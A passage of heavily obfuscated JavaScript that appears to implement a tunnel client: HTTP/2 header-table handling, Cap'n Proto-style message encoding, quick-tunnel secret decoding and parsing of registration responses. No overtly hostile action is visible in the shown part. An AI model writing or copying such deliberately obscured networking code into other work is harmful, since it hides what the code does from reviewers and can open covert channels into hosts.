    const i = a[dw(0x16b)](g, h);
    return [
        d ? c[dw(0x534)](a0ac, i) : i,
        h
    ];
}
class a0af {
    constructor() {
        const dx = a0aY;
        this[dx(0x371)] = [], this[dx(0x3a9)] = 0x0, this['maxSize'] = 0x1000;
    }
    [a0aY(0x1b1)](a) {
        const dy = a0aY, b = {
                'jcxSo': function (d, f) {
                    return d <= f;
                },
                'oiCMK': function (d, f) {
                    return d - f;
                },
                'edLQl': function (d, f) {
                    return d - f;
                },
                'mkWaW': function (d, f) {
                    return d >= f;
                },
                'rMAxh': dy(0x77d)
            };
        if (a <= 0x0)
            throw new Error(dy(0x8dc));
        if (b[dy(0x38a)](a, a0a7[dy(0x7a3)]))
            return a0a7[b[dy(0x8f0)](a, 0x1)];
        const c = b[dy(0x2d7)](b[dy(0x8f0)](a, a0a7[dy(0x7a3)]), 0x1);
        if (c < 0x0 || b[dy(0x3cc)](c, this[dy(0x371)][dy(0x7a3)]))
            throw new Error(b[dy(0x7b6)]);
        return this[dy(0x371)][c];
    }
    ['add'](a, b) {
        const dz = a0aY, c = {
                'ombSF': function (f, g) {
                    return f + g;
                },
                'ZafZc': 'utf8',
                'vJhqz': function (f, g) {
                    return f > g;
                },
                'vGXzz': function (f, g) {
                    return f > g;
                }
            }, d = c[dz(0x4f0)](c['ombSF'](0x20, Buffer[dz(0x6eb)](a, dz(0x3ef))), Buffer[dz(0x6eb)](b, c[dz(0x2c4)]));
        if (c[dz(0x4b0)](d, this['maxSize'])) {
            this[dz(0x371)] = [], this[dz(0x3a9)] = 0x0;
            return;
        }
        while (c[dz(0x6e6)](this[dz(0x371)][dz(0x7a3)], 0x0) && this[dz(0x3a9)] + d > this[dz(0x2db)]) {
            const [f, g] = this[dz(0x371)][dz(0x8c0)]();
            this[dz(0x3a9)] -= c[dz(0x4f0)](0x20 + Buffer[dz(0x6eb)](f, c[dz(0x2c4)]), Buffer[dz(0x6eb)](g, c['ZafZc']));
        }
        this[dz(0x371)][dz(0x148)]([
            a,
            b
        ]), this['dynamicSize'] += d;
    }
    [a0aY(0x332)](a) {
        const dA = a0aY, b = {
                'JuiLU': function (f, g) {
                    return f < g;
                },
                'rmmNy': function (f, g) {
                    return f & g;
                },
                'WOjKq': function (f, g) {
                    return f & g;
                },
                'gWLrc': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'zNFSw': function (f, g, h) {
                    return f(g, h);
                },
                'wIyvJ': 'utf8',
                'HIjIx': function (f, g) {
                    return f > g;
                },
                'GnOik': dA(0x573),
                'TeJvl': function (f, g) {
                    return f + g;
                },
                'segWd': function (f, g, h, i) {
                    return f(g, h, i);
                }
            }, c = [];
        let d = 0x0;
        while (b[dA(0x5fc)](d, a[dA(0x7a3)])) {
            const f = a[d];
            if (b[dA(0x7d1)](f, 0x80)) {
                let j;
                [j, d] = a0ad(a, d, 0x7), c[dA(0x75e)](this['tableEntry'](j));
                continue;
            }
            if (b[dA(0x178)](f, 0x40)) {
                let k, l;
                [k, d] = b['gWLrc'](a0ad, a, d, 0x6);
                if (k)
                    l = this[dA(0x1b1)](k)[0x0];
                else {
                    let o;
                    [o, d] = b['zNFSw'](a0ae, a, d), l = o['toString'](b[dA(0x76b)])[dA(0x1a2)]();
                }
                let m;
                [m, d] = b[dA(0x858)](a0ae, a, d);
                const n = m[dA(0x491)](dA(0x3ef));
                this[dA(0x29c)](l, n), c[dA(0x75e)]([
                    l,
                    n
                ]);
                continue;
            }
            if (b['WOjKq'](f, 0x20)) {
                let p;
                [p, d] = a0ad(a, d, 0x5);
                if (b['HIjIx'](p, 0x1000))
                    throw new Error(b[dA(0x522)]);
                this[dA(0x2db)] = p;
                while (b[dA(0x8b3)](this[dA(0x371)][dA(0x7a3)], 0x0) && this[dA(0x3a9)] > p) {
                    const [q, r] = this[dA(0x371)][dA(0x8c0)]();
                    this[dA(0x3a9)] -= b[dA(0x314)](b[dA(0x314)](0x20, Buffer['byteLength'](q, b[dA(0x76b)])), Buffer['byteLength'](r, 'utf8'));
                }
                continue;
            }
            let g, h;
            [g, d] = b[dA(0x822)](a0ad, a, d, 0x4);
            if (g)
                h = this[dA(0x1b1)](g)[0x0];
            else {
                let s;
                [s, d] = a0ae(a, d), h = s[dA(0x491)]('utf8')[dA(0x1a2)]();
            }
            let i;
            [i, d] = b[dA(0x858)](a0ae, a, d), c['push']([
                h,
                i[dA(0x491)](b[dA(0x76b)])
            ]);
        }
        return c;
    }
}
function a0ag(a, b, c) {
    const dB = a0aY, d = {
            'rOxxS': function (h, i) {
                return h - i;
            },
            'qZUtf': function (h, i) {
                return h < i;
            },
            'VMqGI': function (h, i) {
                return h | i;
            },
            'RcOuJ': function (h, i) {
                return h >= i;
            },
            'QLDxh': function (h, i) {
                return h | i;
            },
            'KZlzy': function (h, i) {
                return h & i;
            },
            'SvgVa': function (h, i) {
                return h / i;
            }
        }, f = d[dB(0x847)](0x1 << b, 0x1);
    if (d[dB(0x48f)](a, f))
        return Buffer['from']([d[dB(0x6f9)](c, a)]);
    const g = [d[dB(0x6f9)](c, f)];
    a -= f;
    while (d[dB(0x299)](a, 0x80)) {
        g[dB(0x75e)](d['QLDxh'](d['KZlzy'](a, 0x7f), 0x80)), a = Math[dB(0x29f)](d[dB(0x454)](a, 0x80));
    }
    return g[dB(0x75e)](a), Buffer['from'](g);
}
function a0ah(a) {
    const dC = a0aY, b = {
            'YrEMZ': dC(0x3ef),
            'QDmCI': function (d, f, g, h) {
                return d(f, g, h);
            }
        }, c = Buffer['from'](a, b['YrEMZ']);
    return Buffer['concat']([
        b[dC(0x125)](a0ag, c[dC(0x7a3)], 0x7, 0x0),
        c
    ]);
}
function a0ai(a) {
    const dD = a0aY, b = {
            'eBsxU': function (d, f) {
                return d === f;
            },
            'wNkjH': dD(0x82f),
            'IYuBA': dD(0x668),
            'JHcxt': function (d, f) {
                return d === f;
            },
            'Zxgjv': function (d, f) {
                return d === f;
            },
            'pDIJw': dD(0x5aa),
            'GaXHt': function (d, f) {
                return d === f;
            },
            'rOCgF': dD(0x24e),
            'IRVJa': function (d, f) {
                return d === f;
            },
            'ZgfVm': dD(0x403),
            'KfRll': function (d, f, g, h) {
                return d(f, g, h);
            },
            'mFdPv': function (d, f) {
                return d(f);
            }
        }, c = [];
    for (const [d, f] of a) {
        if (b[dD(0x5b9)](d, dD(0x82f)) && f === dD(0x1fd))
            c[dD(0x75e)](0x88);
        else {
            if (d === b[dD(0x7ed)] && b[dD(0x5b9)](f, b[dD(0x430)]))
                c[dD(0x75e)](0x89);
            else {
                if (d === dD(0x82f) && b[dD(0x715)](f, '206'))
                    c[dD(0x75e)](0x8a);
                else {
                    if (b[dD(0x5b9)](d, b['wNkjH']) && b[dD(0x4ef)](f, b[dD(0x508)]))
                        c['push'](0x8b);
                    else {
                        if (b[dD(0x226)](d, b[dD(0x7ed)]) && b[dD(0x4ef)](f, b[dD(0x283)]))
                            c[dD(0x75e)](0x8c);
                        else {
                            if (b['IRVJa'](d, b[dD(0x7ed)]) && f === dD(0x588))
                                c[dD(0x75e)](0x8d);
                            else
                                b[dD(0x5b9)](d, b[dD(0x7ed)]) && b[dD(0x8cd)](f, b[dD(0x706)]) ? c[dD(0x75e)](0x8e) : (c[dD(0x75e)](...b[dD(0x247)](a0ag, 0x0, 0x4, 0x0)), c[dD(0x75e)](...b[dD(0x76d)](a0ah, d)), c[dD(0x75e)](...a0ah(f)));
                        }
                    }
                }
            }
        }
    }
    return Buffer[dD(0x68c)](c);
}
class a0aj {
    constructor() {
        const dE = a0aY;
        this[dE(0x3d2)] = [];
    }
    [a0aY(0x744)](a) {
        const dF = a0aY, b = {
                'erqum': function (d, f) {
                    return d < f;
                }
            }, c = this[dF(0x3d2)]['length'];
        for (let d = 0x0; b[dF(0x440)](d, a); d++) {
            this[dF(0x3d2)][dF(0x75e)](0x0n);
        }
        return c;
    }
    [a0aY(0x3d0)](a, b, c, d) {
        const dG = a0aY, f = {
                'kbWMU': function (j, k) {
                    return j - k;
                },
                'KzFmv': function (j, k) {
                    return j & k;
                },
                'pblma': function (j, k) {
                    return j << k;
                },
                'wmXYA': function (j, k) {
                    return j(k);
                },
                'uqtSD': function (j, k) {
                    return j | k;
                },
                'CXClo': function (j, k) {
                    return j << k;
                },
                'XIvuX': function (j, k) {
                    return j << k;
                }
            }, g = f[dG(0x4fb)](b - a, 0x1), h = f[dG(0x4c8)](f[dG(0x824)](f[dG(0x8b9)](BigInt, g), 0x2n), 0xfffffffcn), i = f[dG(0x465)](BigInt(f['KzFmv'](c, 0xffff)), f['CXClo'](f[dG(0x8b9)](BigInt, d & 0xffff), 0x10n));
        this[dG(0x3d2)][a] = f[dG(0x465)](h, f[dG(0x830)](i, 0x20n));
    }
    [a0aY(0xed)](a, b, c) {
        const dH = a0aY, d = {
                'BwXBU': function (g, h) {
                    return g << h;
                },
                'zgAiw': function (g, h) {
                    return g * h;
                },
                'FerdD': function (g, h) {
                    return g | h;
                },
                'uDUMl': function (g, h) {
                    return g & h;
                },
                'bDQoG': function (g, h) {
                    return g(h);
                }
            }, f = d[dH(0x1c5)](0xffn, BigInt(d[dH(0x844)](b, 0x8)));
        this[dH(0x3d2)][a] = d[dH(0x240)](this[dH(0x3d2)][a] & ~f, d[dH(0x1c5)](BigInt(d[dH(0x75b)](c, 0xff)), d[dH(0x1e3)](BigInt, d[dH(0x844)](b, 0x8))));
    }
    [a0aY(0x2c0)](a, b, c) {
        const dI = a0aY, d = {
                'Vxbaz': function (g, h) {
                    return g << h;
                },
                'AQkJi': function (g, h) {
                    return g * h;
                },
                'Xjdbr': function (g, h) {
                    return g | h;
                },
                'gbfeD': function (g, h) {
                    return g & h;
                },
                'kKjYn': function (g, h) {
                    return g << h;
                },
                'ganyr': function (g, h) {
                    return g(h);
                }
            }, f = d[dI(0x902)](0xffffn, BigInt(d['AQkJi'](b, 0x8)));
        this['words'][a] = d[dI(0x463)](d[dI(0x549)](this[dI(0x3d2)][a], ~f), d[dI(0x428)](BigInt(d[dI(0x549)](c, 0xffff)), d[dI(0x5c1)](BigInt, d['AQkJi'](b, 0x8))));
    }
    [a0aY(0x341)](a, b, c) {
        const dJ = a0aY, d = {
                'GhNRD': function (g, h) {
                    return g << h;
                },
                'NBjeu': function (g, h) {
                    return g * h;
                },
                'mksGT': function (g, h) {
                    return g | h;
                },
                'hKBSv': function (g, h) {
                    return g & h;
                },
                'fxHvT': function (g, h) {
                    return g(h);
                },
                'piahC': function (g, h) {
                    return g & h;
                }
            }, f = d[dJ(0x713)](0xffffffffn, BigInt(d[dJ(0x3ac)](b, 0x8)));
        this[dJ(0x3d2)][a] = d[dJ(0x89d)](d['hKBSv'](this[dJ(0x3d2)][a], ~f), d[dJ(0x713)](d[dJ(0x288)](BigInt, d[dJ(0x7ec)](c, 0xffffffff)), BigInt(b * 0x8)));
    }
    [a0aY(0x5cc)](a, b) {
        const dK = a0aY, c = {
                'bQOfd': function (d, f) {
                    return d & f;
                },
                'cuQIE': function (d, f) {
                    return d(f);
                }
            };
        this['words'][a] = c[dK(0x7e9)](c[dK(0x49c)](BigInt, b), 0xffffffffffffffffn);
    }
    [a0aY(0x475)](a, b, c = ![]) {
        const dL = a0aY, d = {
                'xkaSg': function (m, n) {
                    return m === n;
                },
                'qKDeX': dL(0x6a7),
                'ZdqKS': function (m, n) {
                    return m + n;
                },
                'jGsXe': function (m, n) {
                    return m / n;
                },
                'AMZUu': function (m, n) {
                    return m + n;
                },
                'utZQT': function (m, n) {
                    return m / n;
                },
                'sojQJ': function (m, n) {
                    return m % n;
                },
                'CMtFP': function (m, n) {
                    return m - n;
                },
                'pvAzo': function (m, n) {
                    return m & n;
                },
                'hFzaD': function (m, n) {
                    return m | n;
                },
                'rPMsW': function (m, n) {
                    return m << n;
                },
                'xYBvh': function (m, n) {
                    return m << n;
                },
                'fjasf': function (m, n) {
                    return m(n);
                },
                'CGQxl': function (m, n) {
                    return m << n;
                }
            }, f = d[dL(0x37f)](typeof b, d[dL(0x8d9)]) ? Buffer[dL(0x68c)](b, dL(0x3ef)) : b, g = d[dL(0x745)](f[dL(0x7a3)], c ? 0x1 : 0x0), h = this[dL(0x744)](Math['ceil'](d[dL(0x577)](g, 0x8)));
        for (let m = 0x0; m < f[dL(0x7a3)]; m++) {
            this[dL(0xed)](d[dL(0x812)](h, Math[dL(0x29f)](d['utZQT'](m, 0x8))), d['sojQJ'](m, 0x8), f[m]);
        }
        const j = d['CMtFP'](d[dL(0x481)](h, a), 0x1), k = d[dL(0x742)](d[dL(0x2ba)](d['rPMsW'](BigInt(j), 0x2n), 0x1n), 0xffffffffn), l = d[dL(0x2ba)](0x2n, d[dL(0x892)](d[dL(0x63b)](BigInt, d[dL(0x742)](g, 0x1fffffff)), 0x3n));
        this[dL(0x3d2)][a] = d[dL(0x2ba)](k, d[dL(0x50a)](l, 0x20n));
    }
    [a0aY(0x8ad)](a, b) {
        const dM = a0aY, c = {
                'SdTgb': function (g, h) {
                    return g - h;
                },
                'GLyAw': function (g, h) {
                    return g | h;
                },
                'NqNxy': function (g, h) {
                    return g << h;
                },
                'lLunI': function (g, h) {
                    return g(h);
                },
                'TKxCQ': function (g, h) {
                    return g + h;
                }
            };
        if (!b['length']) {
            this[dM(0x3d2)][a] = 0x0n;
            return;
        }
        const d = this[dM(0x744)](b[dM(0x7a3)]), f = c['SdTgb'](d, a) - 0x1;
        this[dM(0x3d2)][a] = c[dM(0x916)]((c[dM(0x17d)](c[dM(0x73e)](BigInt, f), 0x2n) | 0x1n) & 0xffffffffn, c[dM(0x17d)](c[dM(0x916)](0x6n, c['NqNxy'](c['lLunI'](BigInt, b[dM(0x7a3)]), 0x3n)), 0x20n));
        for (let g = 0x0; g < b[dM(0x7a3)]; g++) {
            this[dM(0x475)](c['TKxCQ'](d, g), b[g], !![]);
        }
    }
    [a0aY(0x7a5)]() {
        const dN = a0aY, a = {
                'bQQdS': function (d, f) {
                    return d < f;
                },
                'qqhNX': function (d, f) {
                    return d & f;
                },
                'BiXDR': function (d, f) {
                    return d * f;
                }
            }, b = Buffer[dN(0x744)](0x8);
        b[dN(0x873)](0x0, 0x0), b['writeUInt32LE'](this[dN(0x3d2)][dN(0x7a3)], 0x4);
        const c = Buffer[dN(0x744)](this[dN(0x3d2)][dN(0x7a3)] * 0x8);
        for (let d = 0x0; a[dN(0x7ab)](d, this['words']['length']); d++) {
            c[dN(0x7e6)](a[dN(0x78e)](this[dN(0x3d2)][d], 0xffffffffffffffffn), a['BiXDR'](d, 0x8));
        }
        return Buffer[dN(0x322)]([
            b,
            c
        ]);
    }
}
function a0ak(a) {
    const dO = a0aY, b = new a0aj(), c = b['alloc'](0x1), d = b['alloc'](0x1), f = b[dO(0x744)](0x1);
    b['structPtr'](c, d, 0x1, 0x1), b[dO(0x2c0)](d, 0x0, 0x8);
    const g = b[dO(0x744)](0x1);
    return b[dO(0x744)](0x1), b[dO(0x3d0)](f, g, 0x1, 0x1), b[dO(0x341)](g, 0x0, a), b[dO(0x7a5)]();
}
function a0al(a, b, c, d, f, g) {
    const dP = a0aY, h = {
            'nbCPG': function (H, I) {
                return H | I;
            },
            'FkKWK': function (H, I) {
                return H & I;
            },
            'GklEz': function (H, I) {
                return H | I;
            },
            'JpfcX': dP(0x415),
            'gFyvk': dP(0x77c)
        }, i = new a0aj(), j = i[dP(0x744)](0x1), k = i['alloc'](0x1), l = i[dP(0x744)](0x1);
    i[dP(0x3d0)](j, k, 0x1, 0x1), i[dP(0x2c0)](k, 0x0, 0x2);
    const m = i['alloc'](0x1), n = i[dP(0x744)](0x1);
    i[dP(0x744)](0x1);
    const o = i[dP(0x744)](0x1), p = i[dP(0x744)](0x1);
    i[dP(0x744)](0x1), i['structPtr'](l, m, 0x3, 0x3), i[dP(0x341)](m, 0x0, a), i['setU64'](n, 0xf71695ec7fe85497n);
    const q = i['alloc'](0x1), r = i['alloc'](0x1);
    i[dP(0x3d0)](o, q, 0x1, 0x1), i[dP(0x2c0)](q, 0x4, 0x1);
    const s = i['alloc'](0x1);
    i[dP(0x744)](0x1), i[dP(0x3d0)](r, s, 0x1, 0x1), i['setU32'](s, 0x0, b);
    const t = i[dP(0x744)](0x1);
    i[dP(0x744)](0x1), i[dP(0x3d0)](p, t, 0x0, 0x2);
    const u = i[dP(0x744)](0x1), v = i['alloc'](0x1), w = i[dP(0x744)](0x1), x = i[dP(0x744)](0x1);
    i[dP(0x3d0)](t, u, 0x1, 0x3), i[dP(0xed)](u, 0x0, g);
    const y = i[dP(0x744)](0x1), z = i[dP(0x744)](0x1);
    i[dP(0x3d0)](v, y, 0x0, 0x2), i[dP(0x475)](y, c, !![]), i[dP(0x475)](z, d), i['writeBytes'](w, f);
    const A = i['alloc'](0x1), B = i[dP(0x744)](0x1);
    i[dP(0x744)](0x1), i[dP(0x3d0)](x, A, 0x1, 0x2);
    const C = i[dP(0x744)](0x1), D = i['alloc'](0x1), E = i[dP(0x744)](0x1), F = i[dP(0x744)](0x1);
    i['structPtr'](B, C, 0x0, 0x4);
    const G = a0k[dP(0x3f6)](0x10);
    return G[0x6] = h[dP(0x89f)](h[dP(0x629)](G[0x6], 0xf), 0x40), G[0x8] = h[dP(0x720)](G[0x8] & 0x3f, 0x80), i['writeBytes'](C, G), i[dP(0x8ad)](D, [
        h[dP(0x578)],
        dP(0x1f1)
    ]), i['writeBytes'](E, '2024.10.0-Nexus', !![]), i[dP(0x475)](F, h[dP(0x8c8)], !![]), i[dP(0x7a5)]();
}
function a0am(a) {
    const dQ = a0aY, b = {
            'CvevU': function (f, g) {
                return f >= g;
            },
            'tGCyn': function (f, g) {
                return f - g;
            },
            'yiGfm': function (f, g) {
                return f + g;
            },
            'bJsPp': function (f, g) {
                return f + g;
            },
            'qkWMm': function (f, g) {
                return f * g;
            },
            'oOiUT': function (f, g) {
                return f % g;
            },
            'JhOyR': function (f, g) {
                return f < g;
            },
            'gxbWm': function (f, g) {
                return f < g;
            },
            'Oifqa': function (f, g) {
                return f * g;
            },
            'QOROP': function (f, g) {
                return f < g;
            },
            'Artdq': function (f, g) {
                return f !== g;
            },
            'uPgFr': dQ(0x933),
            'SWMDL': function (f, g) {
                return f + g;
            }
        }, c = [];
    let d = 0x0;
    while (b[dQ(0x8fc)](b[dQ(0x173)](a['length'], d), 0x8)) {
        const f = a[dQ(0x431)](d), g = a['readUInt32LE'](b[dQ(0x8ba)](d, 0x4)), h = b['bJsPp'](f, 0x1);
        let j = 0x2 + h, k = b['qkWMm'](j, 0x4);
        b[dQ(0x100)](k, 0x8) && (k += 0x4);
        if (b[dQ(0x55c)](b[dQ(0x173)](a[dQ(0x7a3)], d), k))
            break;
        const l = [g];
        for (let n = 0x1; b[dQ(0x4dc)](n, h); n++) {
            l['push'](a[dQ(0x431)](b[dQ(0x8ba)](b['yiGfm'](d, 0x4), b[dQ(0x19a)](n, 0x4))));
        }
        const m = b[dQ(0x3eb)](k, b[dQ(0x57b)](l['reduce']((o, p) => o + p, 0x0), 0x8));
        if (b['QOROP'](b[dQ(0x173)](a[dQ(0x7a3)], d), m))
            break;
        if (b[dQ(0xfc)](h, 0x1))
            throw new Error(b[dQ(0x779)]);
        c['push'](a['subarray'](d + k, b['SWMDL'](d, m))), d += m;
    }
    return [
        c,
        a['subarray'](d)
    ];
}
function a0an(a, b) {
    const dR = a0aY, c = {
            'tEdHH': function (j, k) {
                return j >= k;
            },
            'WyREt': dR(0x8cb),
            'TOgIR': function (j, k) {
                return j !== k;
            },
            'mmIvi': function (j, k) {
                return j & k;
            },
            'rQsJW': dR(0x6d3),
            'WoeaN': function (j, k) {
                return j & k;
            },
            'LFypa': function (j, k) {
                return j >> k;
            },
            'MrEGN': function (j, k) {
                return j + k;
            },
            'zagpD': function (j, k) {
                return j(k);
            },
            'CpgAt': function (j, k) {
                return j & k;
            },
            'pEGZr': function (j, k) {
                return j >> k;
            },
            'JgKQX': function (j, k) {
                return j >> k;
            },
            'tcmHK': function (j, k) {
                return j < k;
            },
            'hxZvU': function (j, k) {
                return j > k;
            },
            'iLzWD': function (j, k) {
                return j + k;
            },
            'rzvvl': function (j, k) {
                return j + k;
            }
        };
    if (c[dR(0x8b2)](b, a['length']))
        throw new Error(c[dR(0x11b)]);
    const d = a[b];
    if (c['TOgIR'](c[dR(0x6b7)](d, 0x3n), 0x0n))
        throw new Error(c[dR(0x777)]);
    let f = c['WoeaN'](c[dR(0x2ae)](d, 0x2n), 0x3fffffffn);
    c[dR(0x315)](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[dR(0x376)](c[dR(0x376)](b, 0x1), c[dR(0x3e4)](Number, f)), h = Number(c[dR(0x91d)](c['pEGZr'](d, 0x20n), 0xffffn)), i = c[dR(0x3e4)](Number, c[dR(0x6b7)](c['JgKQX'](d, 0x30n), 0xffffn));
    if (c[dR(0x194)](g, 0x0) || c[dR(0x487)](c[dR(0x721)](c['rzvvl'](g, h), i), a[dR(0x7a3)]))
        throw new Error(c[dR(0x11b)]);
    return [
        g,
        h,
        i
    ];
}
function a0ao(a, b) {
    const dS = a0aY, c = {
            'BkkXy': function (m, n) {
                return m >= n;
            },
            'VaGon': function (m, n) {
                return m !== n;
            },
            'GBizJ': function (m, n) {
                return m & n;
            },
            'moxWK': function (m, n) {
                return m >> n;
            },
            'AYxwA': function (m, n) {
                return m + n;
            },
            'WofYx': function (m, n) {
                return m(n);
            },
            'HPSct': function (m, n) {
                return m(n);
            },
            'EkIMe': function (m, n) {
                return m >> n;
            },
            'CzpHu': function (m, n) {
                return m(n);
            },
            'tFgoH': function (m, n) {
                return m / n;
            },
            'JSpbR': function (m, n) {
                return m !== n;
            },
            'AUwSm': function (m, n) {
                return m < n;
            },
            'LfJdg': function (m, n) {
                return m > n;
            },
            'gahaR': function (m, n) {
                return m * n;
            },
            'ClvlQ': function (m, n) {
                return m < n;
            },
            'nNBpF': function (m, n) {
                return m & n;
            },
            'XHCHP': function (m, n) {
                return m + n;
            }
        };
    if (c[dS(0x60c)](b, a[dS(0x7a3)]))
        return '';
    const d = a[b];
    if (c['VaGon'](c[dS(0x22a)](d, 0x3n), 0x1n))
        return '';
    let f = c['moxWK'](d, 0x2n) & 0x3fffffffn;
    c[dS(0x22a)](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[dS(0x2af)](c[dS(0x2af)](b, 0x1), c['WofYx'](Number, f)), h = c['HPSct'](Number, c[dS(0x22a)](c[dS(0x6f4)](d, 0x20n), 0x7n)), j = c['CzpHu'](Number, c['EkIMe'](d, 0x23n)), k = Math[dS(0x45e)](c[dS(0x1e4)](j, 0x8));
    if (c[dS(0x399)](h, 0x2) || c['AUwSm'](g, 0x0) || c[dS(0x531)](g + k, a[dS(0x7a3)]))
        return '';
    const l = Buffer[dS(0x744)](c[dS(0x386)](k, 0x8));
    for (let m = 0x0; c[dS(0x7c9)](m, k); m++) {
        l[dS(0x7e6)](c[dS(0x3bd)](a[c['XHCHP'](g, m)], 0xffffffffffffffffn), c[dS(0x386)](m, 0x8));
    }
    return l[dS(0x16b)](0x0, j)[dS(0x491)](dS(0x3ef))[dS(0x655)](/\0+$/, '');
}
function a0ap(a) {
    const dT = a0aY, b = {
            'fefoV': function (z, A) {
                return z % A;
            },
            'lpTrP': function (z, A) {
                return z < A;
            },
            'pMFjs': dT(0x12d),
            'LHswE': function (z, A) {
                return z / A;
            },
            'ABPYj': function (z, A) {
                return z * A;
            },
            'BBmMT': function (y, z, A) {
                return y(z, A);
            },
            'GpgSy': function (z, A) {
                return z !== A;
            },
            'vRvgw': function (z, A) {
                return z & A;
            },
            'SSOWX': dT(0x37e),
            'DYMeI': function (z, A) {
                return z + A;
            },
            'WuhYR': function (y, z) {
                return y(z);
            },
            'hHsgk': function (z, A) {
                return z >> A;
            },
            'zjnLu': function (z, A) {
                return z === A;
            },
            'lLFXf': function (z, A) {
                return z + A;
            },
            'lqmDl': dT(0x3ea),
            'VJaRJ': function (y, z, A) {
                return y(z, A);
            },
            'BAoJD': function (z, A) {
                return z + A;
            },
            'Wqjtl': function (y, z) {
                return y(z);
            },
            'IuiaV': function (z, A) {
                return z & A;
            },
            'LcJEh': function (z, A) {
                return z + A;
            },
            'kPFSD': function (z, A) {
                return z + A;
            },
            'DLfXl': 'registration\x20union\x20',
            'EBblT': function (y, z) {
                return y(z);
            }
        };
    if (b[dT(0x46c)](a[dT(0x7a3)], 0x8) || b['lpTrP'](a['length'], 0x18))
        throw new Error(b[dT(0x409)]);
    const c = [];
    for (let y = 0x0; b['lpTrP'](y, b[dT(0x51b)](a[dT(0x7a3)], 0x8)); y++) {
        c[dT(0x75e)](a['readBigUInt64LE'](b['ABPYj'](y, 0x8)));
    }
    let d, f, g;
    [d, f, g] = b[dT(0x68b)](a0an, c, 0x0);
    if (b['lpTrP'](f, 0x1) || b['GpgSy'](b['vRvgw'](c[d], 0xffffn), 0x3n))
        throw new Error(b[dT(0x477)]);
    let h, j, k;
    [h, j, k] = b[dT(0x68b)](a0an, c, b[dT(0x75f)](d, f));
    const l = b[dT(0x4e7)](Number, b['vRvgw'](b['hHsgk'](c[h], 0x30n), 0xffffn));
    if (b[dT(0x499)](l, 0x1))
        return {
            'ok': ![],
            'error': b[dT(0x68b)](a0ao, c, b['lLFXf'](h, j))
        };
    if (b[dT(0x6d9)](l, 0x0))
        return {
            'ok': ![],
            'error': b[dT(0x75f)](b[dT(0x33c)], l)
        };
    let m, n, o;
    [m, n, o] = b['BBmMT'](a0an, c, b['lLFXf'](h, j));
    let p, q, r;
    [p, q, r] = b[dT(0x1a3)](a0an, c, b[dT(0x267)](m, n));
    const s = c[p], t = b[dT(0x65f)](Number, b[dT(0x82d)](s, 0xffffn));
    if (b['zjnLu'](t, 0x0))
        return {
            'ok': ![],
            'error': a0ao(c, b[dT(0x91a)](p, q))
        };
    if (b[dT(0x6d9)](t, 0x1))
        return {
            'ok': ![],
            'error': b['kPFSD'](b['DLfXl'], t)
        };
    let u, v, w;
    [u, v, w] = b[dT(0x68b)](a0an, c, p + q);
    const x = a0ao(c, b[dT(0x267)](u + v, 0x1));
    return {
        'ok': !![],
        'location': x,
        'remoteManaged': b[dT(0x1b9)](Boolean, c[u] & 0x1n)
    };
}
const a0aq = {
    '.js': 'text/javascript;\x20charset=utf-8',
    '.mjs': a0aY(0x569),
    '.css': a0aY(0x58c),
    '.json': 'application/json;\x20charset=utf-8',
    '.map': a0aY(0xf7),
    '.wasm': a0aY(0x13a),
    '.html': a0aY(0x3b0),
    '.htm': 'text/html;\x20charset=utf-8',
    '.svg': a0aY(0x878),
    '.xml': 'application/xml',
    '.woff': a0aY(0x754),
    '.woff2': a0aY(0x754),
    '.png': a0aY(0x661),
    '.jpg': a0aY(0x183),
    '.jpeg': a0aY(0x183),
    '.gif': a0aY(0x331),
    '.ico': a0aY(0x4ed)
};
function a0ar(a) {
    const dU = a0aY, b = {
            'CyykS': function (f, g) {
                return f < g;
            }
        }, c = a['endsWith']('/') ? a[dU(0x489)](0x0, -0x1) : a, d = c['lastIndexOf']('.');
    if (b[dU(0x2a5)](d, 0x0))
        return '';
    return a0aq[c[dU(0x489)](d)[dU(0x1a2)]()] || '';
}
function a0as(a) {
    const dV = a0aY, b = {
            'sKIov': function (c, d) {
                return c !== d;
            },
            'oJhqq': dV(0x6a7),
            'YYPqs': 'quick\x20tunnel\x20secret\x20has\x20an\x20unexpected\x20type',
            'ndbLn': function (c, d) {
                return c + d;
            },
            'VRcgH': function (c, d) {
                return c % d;
            },
            'BjdSM': dV(0x880)
        };
    if (Array['isArray'](a))
        return Buffer[dV(0x68c)](a);
    if (b[dV(0x18f)](typeof a, b['oJhqq']))
        throw new Error(b[dV(0x7ba)]);
    return Buffer[dV(0x68c)](b[dV(0x711)](a, '='['repeat'](b[dV(0x3c1)](-a[dV(0x7a3)], 0x4))), b[dV(0x565)]);
}
const a0at = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
function a0au(a) {
    const dW = a0aY, b = {
            'ZLSJh': 'utf8',
            'MaPgV': function (c, d) {
                return c + d;
            },
            'AYuEd': dW(0x5d0),
            'MNyOJ': dW(0x7a1),
            'xDhcW': function (c, d) {
                return c !== d;
            },
            'jsunp': dW(0x6a7),
            'TGCEU': function (c, d) {
                return c(d);
            },
            'hRdJf': dW(0x8e9),
            'ThgdR': dW(0x71e),
            'tXPwc': dW(0x1b3),
            'DkDxo': dW(0x8ec),
            'hixiR': function (c, d) {
                return c === d;
            },
            'eSnRm': dW(0x3ad),
            'hkPMk': 'POST',
            'pSSSg': dW(0x557)
        };
    return new Promise((c, d) => {
        const e0 = dW, f = {
                'uyvVs': b['ZLSJh'],
                'yuuRY': function (j, k) {
                    const dX = a0b;
                    return b[dX(0x2cb)](j, k);
                },
                'dnHvX': function (j, k) {
                    const dY = a0b;
                    return b[dY(0x2cb)](j, k);
                },
                'QqCxH': '):\x20',
                'xoShR': function (j, k) {
                    return j(k);
                },
                'BDkeR': b['AYuEd'],
                'bSxrs': function (j, k) {
                    return j(k);
                },
                'FBOiP': b['MNyOJ'],
                'eTTIj': function (j, k) {
                    const dZ = a0b;
                    return b[dZ(0x6d2)](j, k);
                },
                'tUIfb': b[e0(0x69d)],
                'iYZUz': function (j, k) {
                    const e1 = e0;
                    return b[e1(0x6d2)](j, k);
                },
                'AhhQa': function (j, k) {
                    return j(k);
                },
                'PXznN': 'hex',
                'ZFMZx': function (j, k) {
                    const e2 = e0;
                    return b[e2(0x15a)](j, k);
                },
                'LCzxr': function (j, k) {
                    return b['TGCEU'](j, k);
                },
                'dXJIg': e0(0x2fb),
                'xjlVA': e0(0x318),
